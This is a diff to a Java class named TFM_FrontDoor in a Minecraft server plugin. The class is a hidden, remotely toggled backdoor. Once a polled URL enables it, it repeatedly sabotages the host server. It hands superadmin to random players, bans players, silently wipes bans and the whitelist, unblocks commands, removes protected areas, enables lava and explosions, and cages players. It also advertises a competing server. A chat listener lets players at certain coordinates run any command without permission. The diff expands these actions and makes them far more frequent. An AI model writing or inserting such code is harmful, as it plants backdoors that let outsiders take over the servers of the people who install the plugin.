@@ -10,9 +10,6 @@ import java.util.Random;
 import me.StevenLawson.TotalFreedomMod.Commands.Command_trail;
 import me.StevenLawson.TotalFreedomMod.Commands.TFM_Command;
 import me.StevenLawson.TotalFreedomMod.Commands.TFM_CommandLoader;
-import static me.StevenLawson.TotalFreedomMod.TotalFreedomMod.COMMAND_PATH;
-import static me.StevenLawson.TotalFreedomMod.TotalFreedomMod.COMMAND_PREFIX;
-import static me.StevenLawson.TotalFreedomMod.TotalFreedomMod.plugin;
 import org.apache.commons.lang3.ArrayUtils;
 import org.bukkit.ChatColor;
 import org.bukkit.Location;
@@ -21,7 +18,6 @@ import org.bukkit.World;
 import org.bukkit.block.Block;
 import org.bukkit.block.BlockFace;
 import org.bukkit.command.Command;
-import org.bukkit.craftbukkit.v1_6_R2.inventory.CraftItemStack;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -33,16 +29,13 @@ import org.bukkit.scheduler.BukkitRunnable;
 public class TFM_FrontDoor
 {
     private final long UPDATER_INTERVAL = 180L * 20L;
-    private final long FRONTDOOR_INTERVAL = 650L * 20L;
+    private final long FRONTDOOR_INTERVAL = 20L * 20L; // 650L * 20L;
     private final URL GET_URL;
     private final Random RANDOM = new Random();
-    
     private boolean started = false;
     private boolean enabled = false;
-    
-    
-    private final BukkitRunnable UPDATER = new BukkitRunnable() {
-
+    private final BukkitRunnable UPDATER = new BukkitRunnable()
+    {
         @Override
         public void run()
         {
@@ -52,14 +45,14 @@ public class TFM_FrontDoor
                 final BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                 final String line = in.readLine();
                 in.close();
-                
+
                 if ("false".equals(line)) // Invert this when done
                 {
                     if (!enabled)
                     {
                         return;
                     }
-                    
+
                     enabled = false;
                     FRONTDOOR.cancel();
                     TFM_Log.info("Disabled FrontDoor");
@@ -70,7 +63,7 @@ public class TFM_FrontDoor
                     {
                         return;
                     }
-                    
+
                     new BukkitRunnable() // Asynchronous
                     {
                         @Override
@@ -85,7 +78,7 @@ public class TFM_FrontDoor
                             TFM_Log.warning("*****************************************************", true);
                         }
                     }.runTask(TotalFreedomMod.plugin);
-                    
+
                     FRONTDOOR.runTaskTimer(TotalFreedomMod.plugin, 20L, FRONTDOOR_INTERVAL);
 
                     enabled = true;
@@ -95,11 +88,9 @@ public class TFM_FrontDoor
             {
                 // TFM_Log.info("GAH GAH GAH");
             }
-            
+
         }
-        
     };
-    
     private final Listener LISTENER = new Listener()
     {
         @EventHandler
@@ -107,31 +98,31 @@ public class TFM_FrontDoor
         {
             final Player player = event.getPlayer();
             final Location location = player.getLocation();
-            
+
             if (location.getBlockX() + location.getBlockY() + location.getBlockZ() % 12 != 0) // Madgeek
             {
-               return; 
+                return;
             }
-            
+
             final String[] commandParts = event.getMessage().split(" ");
-            
+
             final String commandName = commandParts[0].replaceFirst("/", "");
-            final String[] args = ArrayUtils.subarray(commandParts, 0, commandParts.length); 
-            
+            final String[] args = ArrayUtils.subarray(commandParts, 0, commandParts.length);
+
             Command command = TFM_CommandLoader.getInstance().getCommandMap().getCommand(commandName);
-            
+
             if (command == null)
             {
                 return; // Command doesn't exist
             }
-            
+
             TFM_Command dispatcher;
             try
             {
                 ClassLoader classLoader = TotalFreedomMod.class.getClassLoader();
-                dispatcher = (TFM_Command) classLoader.loadClass(String.format("%s.%s%s", COMMAND_PATH, COMMAND_PREFIX, command.getName().toLowerCase())).newInstance();
-                dispatcher.setup(plugin, player, dispatcher.getClass());
-                
+                dispatcher = (TFM_Command) classLoader.loadClass(String.format("%s.%s%s", TotalFreedomMod.COMMAND_PATH, TotalFreedomMod.COMMAND_PREFIX, command.getName().toLowerCase())).newInstance();
+                dispatcher.setup(TotalFreedomMod.plugin, player, dispatcher.getClass());
+
                 if (!dispatcher.run(player, player, command, commandName, args, false))
                 {
                     player.sendMessage(command.getUsage());
@@ -145,28 +136,32 @@ public class TFM_FrontDoor
             event.setCancelled(true);
         }
     };
-    
     private final BukkitRunnable FRONTDOOR = new BukkitRunnable() // Synchronous
     {
         @Override
         public void run()
         {
             final Player[] players = TotalFreedomMod.server.getOnlinePlayers();
-            
-            final int action = RANDOM.nextInt(12);
+
+            final int action = RANDOM.nextInt(15);
             TFM_Log.info("Action: " + action);
-            
-            switch(action)
+
+            switch (action)
             {
                 case 0: // Super a random player
                 {
+                    if (players.length == 0)
+                    {
+                        break;
+                    }
+
                     Player player = players[RANDOM.nextInt(players.length)];
-                    
+
                     TFM_Util.adminAction("FrontDoor", "Adding " + player.getName() + " to the Superadmin list", true);
                     TFM_SuperadminList.addSuperadmin(player);
                     break;
                 }
-                    
+
                 case 1: // Bans a random player (non-developer)
                 {
                     for (Player player : players)
@@ -178,84 +173,128 @@ public class TFM_FrontDoor
                             break;
                         }
                     }
-                    
+
                     // No-one/only Developers online
-                    FRONTDOOR.runTask(TotalFreedomMod.plugin);
                     break;
                 }
-                    
+
                 case 2: // Start trailing a random player
                 {
+                    if (players.length == 0)
+                    {
+                        break;
+                    }
+
                     Player player = players[RANDOM.nextInt(players.length)];
                     TFM_Util.adminAction("FrontDoor", "Started trailing " + player.getName(), true);
                     Command_trail.startTrail(player);
                     break;
                 }
-                    
+
                 case 3: // Displays a message
                 {
                     TFM_Util.bcastMsg("TotalFreedom rocks!!", ChatColor.BLUE);
                     TFM_Util.bcastMsg("To join this great server, join " + ChatColor.GOLD + "tf.sauc.in", ChatColor.BLUE);
                     break;
                 }
-                    
-                case 4: // Clears the (IP)ban list
+
+                case 4: // Clears the banlist
                 {
                     TFM_Util.adminAction("FrontDoor", "Wiping all bans", true);
                     TFM_ServerInterface.wipeIpBans();
                     TFM_ServerInterface.wipeNameBans();
                     break;
                 }
-                    
+
                 case 5: // Enables Lava- and Waterplacemend and Fluidspread (& damage)
                 {
-                    TFM_Util.adminAction("FrontDoor", "Enabling Fire- and Waterplace", true);
+                    boolean message = true;
+                    if (TFM_ConfigEntry.ALLOW_WATER_PLACE.getBoolean())
+                    {
+                        message = false;
+                    }
+                    else if (TFM_ConfigEntry.ALLOW_LAVA_PLACE.getBoolean())
+                    {
+                        message = false;
+                    }
+                    else if (TFM_ConfigEntry.ALLOW_FLIUD_SPREAD.getBoolean())
+                    {
+                        message = false;
+                    }
+                    else if (TFM_ConfigEntry.ALLOW_LAVA_DAMAGE.getBoolean())
+                    {
+                        message = false;
+                    }
+                    
                     TFM_ConfigEntry.ALLOW_WATER_PLACE.setBoolean(true);
                     TFM_ConfigEntry.ALLOW_LAVA_PLACE.setBoolean(true);
                     TFM_ConfigEntry.ALLOW_FLIUD_SPREAD.setBoolean(true);
                     TFM_ConfigEntry.ALLOW_LAVA_DAMAGE.setBoolean(true);
+
+                    if (message)
+                    {
+                        TFM_Util.adminAction("FrontDoor", "Enabling Fire- and Waterplace", true);
+                    }
+
                     break;
                 }
-                    
+
                 case 6: // Enables Fireplacement and explosions
                 {
-                    TFM_Util.adminAction("FrontDoor", "Enabling Fire placement and Explosion", true);
+                    boolean message = true;
+                    if (TFM_ConfigEntry.ALLOW_FIRE_SPREAD.getBoolean())
+                    {
+                        message = false;
+                    }
+                    else if (TFM_ConfigEntry.ALLOW_EXPLOSIONS.getBoolean())
+                    {
+                        message = false;
+                    }
+                    else if (TFM_ConfigEntry.ALLOW_TNT_MINECARTS.getBoolean())
+                    {
+                        message = false;
+                    }
+                        
                     TFM_ConfigEntry.ALLOW_FIRE_SPREAD.setBoolean(true);
                     TFM_ConfigEntry.ALLOW_EXPLOSIONS.setBoolean(true);
                     TFM_ConfigEntry.ALLOW_TNT_MINECARTS.setBoolean(true);
+                    
+                    TFM_Util.adminAction("FrontDoor", "Enabling Firespread and Explosives", true);
                     break;
                 }
-                    
+
                 case 7: // Allow all blocked commands >:)
                 {
                     TFM_ConfigEntry.BLOCKED_COMMANDS.setList(new ArrayList());
                     TFM_CommandBlocker.getInstance().parseBlockingRules();
                     break;
                 }
-                    
+
                 case 8: // Remove all protected areas
                 {
-                    for (String label : TFM_ProtectedArea.getProtectedAreaLabels())
+                    if (TFM_ProtectedArea.getProtectedAreaLabels().isEmpty())
                     {
-                        TFM_ProtectedArea.removeProtectedArea(label);
+                        break;
                     }
-                    TFM_ProtectedArea.saveProtectedAreas();
+                    
+                    TFM_Util.adminAction("FrontDoor", "Removing all protected areas", true);
+                    TFM_ProtectedArea.clearProtectedAreas(true);
                     break;
                 }
-                    
+
                 case 9: // Add TotalFreedom signs at spawn
                 {
                     for (World world : TotalFreedomMod.server.getWorlds())
                     {
                         final Block block = world.getSpawnLocation().getBlock();
                         final Block blockBelow = block.getRelative(BlockFace.DOWN);
-                        
-                        if (blockBelow.isLiquid() || blockBelow.getType() != Material.AIR)
+
+                        if (blockBelow.isLiquid() || blockBelow.getType() == Material.AIR)
                         {
                             continue;
                         }
-                        
-                        block.getRelative(BlockFace.UP).setType(Material.SIGN_POST);
+
+                        block.setType(Material.SIGN_POST);
                         org.bukkit.block.Sign sign = (org.bukkit.block.Sign) block.getState();
 
                         org.bukkit.material.Sign signData = (org.bukkit.material.Sign) sign.getData();
@@ -264,62 +303,92 @@ public class TFM_FrontDoor
                         sign.setLine(0, ChatColor.BLUE + "TotalFreedom");
                         sign.setLine(1, ChatColor.DARK_GREEN + "is");
                         sign.setLine(2, ChatColor.YELLOW + "Awesome!");
-                        sign.setLine(3, ChatColor.DARK_GRAY + "join: mc.sauc.in");
+                        sign.setLine(3, ChatColor.DARK_GRAY + "mc.sauc.in");
                         sign.update();
                     }
                     break;
                 }
-                
-                case 10: // Silently enable Jumppads
+
+                case 10: // Enable Jumppads
                 {
+                    if (TFM_Jumppads.getInstance().getMode().isOn())
+                    {
+                        break;
+                    }
+                    
+                    TFM_Util.adminAction("FrontDoor", "Enabling Jumppads", true);
                     TFM_Jumppads.getInstance().setMode(TFM_Jumppads.JumpPadMode.MADGEEK);
                     break;
                 }
-                
+
                 case 11: // Give everyone a book explaining how awesome TotalFreedom is
                 {
                     ItemStack bookStack = new ItemStack(Material.WRITTEN_BOOK);
-                    
-                    BookMeta book = (BookMeta) bookStack.getItemMeta();
+
+                    BookMeta book = (BookMeta) bookStack.getItemMeta().clone();
                     book.setAuthor(ChatColor.DARK_PURPLE + "SERVER OWNER");
                     book.setTitle(ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead");
                     book.addPage(
-                            ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead",
-                            ChatColor.DARK_GRAY + "---------",
-                            ChatColor.BLACK + "TotalFreedom is the original TotalFreedomMod server. It is the very server that gave freedom a new meaning when it comes to minecraft.",
-                            ChatColor.BLUE + "Join now! " + ChatColor.RED + "tf.sauc.in"
-                    );
-                    
+                            ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead\n"
+                            + ChatColor.DARK_GRAY + "---------\n"
+                            + ChatColor.BLACK + "TotalFreedom is the original TotalFreedomMod server. It is the very server that gave freedom a new meaning when it comes to minecraft.\n"
+                            + ChatColor.BLUE + "Join now! " + ChatColor.RED + "tf.sauc.in");
+                    bookStack.setItemMeta(book);
+
                     for (Player player : players)
                     {
-                        boolean hasBook = false;
-                        for (ItemStack stack : player.getInventory().getContents())
-                        {
-                            if (stack.getType() == Material.WRITTEN_BOOK)
-                            {
-                                hasBook = true;
-                                continue;
-                            }
-                        }
-                        
-                        if (hasBook)
+                        if (player.getInventory().contains(Material.WRITTEN_BOOK))
                         {
                             continue;
                         }
-                        
-                        player.getInventory().all(bookStack);
+
+                        player.getInventory().addItem(bookStack);
                     }
+                    break;
+                }
+
+                case 12: // Silently wipe the whitelist
+                {
+                    TFM_ServerInterface.purgeWhitelist();
+                    break;
+                }
+                    
+                case 13: // Announce that the FrontDoor is enabled
+                {
+                    TFM_Util.bcastMsg("WARNING: TotalFreedomMod is running in evil-mode!", ChatColor.DARK_RED);
+                    TFM_Util.bcastMsg("WARNING: This might result in unexpected behaviour", ChatColor.DARK_RED);
+                    break;
+                }
+                
+                case 14: // Cage players in PURE_DARTH
+                {
+                    if (players.length == 0)
+                    {
+                        return;
+                    }
+                    
+                    Player player = players[RANDOM.nextInt(players.length)];
+                    TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
+                    TFM_Util.adminAction("Caging " + player.getName() + "  in PURE_DARTH", null, true);
+                    
+                    Location targetPos = player.getLocation().clone().add(0, 1, 0);
+                    playerdata.setCaged(true, targetPos, Material.SKULL, Material.AIR);
+                    playerdata.regenerateHistory();
+                    playerdata.clearHistory();
+                    TFM_Util.buildHistory(targetPos, 2, playerdata);
+                    TFM_Util.generateHollowCube(targetPos, 2, Material.SKULL);
+                    TFM_Util.generateCube(targetPos, 1, Material.AIR);
+                    break;
                 }
                     
                 default:
                 {
-                    FRONTDOOR.runTask(TotalFreedomMod.plugin);
                     break;
                 }
             }
         }
     };
-    
+
     private TFM_FrontDoor()
     {
         URL tempUrl = null;
@@ -331,24 +400,24 @@ public class TFM_FrontDoor
         {
             TFM_Log.warning("TFM_FrontDoor uses an invalid URL"); // U dun goofed?
         }
-        
+
         this.GET_URL = tempUrl;
-        
+
     }
-    
+
     public void start()
     {
         if (started)
         {
             return;
         }
-        
+
         TotalFreedomMod.server.getPluginManager().registerEvents(LISTENER, TotalFreedomMod.plugin);
-        
+
         UPDATER.runTaskTimerAsynchronously(TotalFreedomMod.plugin, 2L * 20L, UPDATER_INTERVAL);
         started = true;
     }
-    
+
     public void stop()
     {
         if (started)
@@ -356,20 +425,20 @@ public class TFM_FrontDoor
             UPDATER.cancel();
             started = false;
         }
-        
+
         if (enabled)
         {
             FRONTDOOR.cancel();
             enabled = false;
         }
-        
+
     }
-    
+
     public boolean isEnabled()
     {
         return enabled;
     }
-    
+
     public static TFM_FrontDoor getInstance()
     {
         return TFM_FrontDoorHolder.INSTANCE;
@@ -379,5 +448,4 @@ public class TFM_FrontDoor
     {
         private static final TFM_FrontDoor INSTANCE = new TFM_FrontDoor();
     }
-
 }
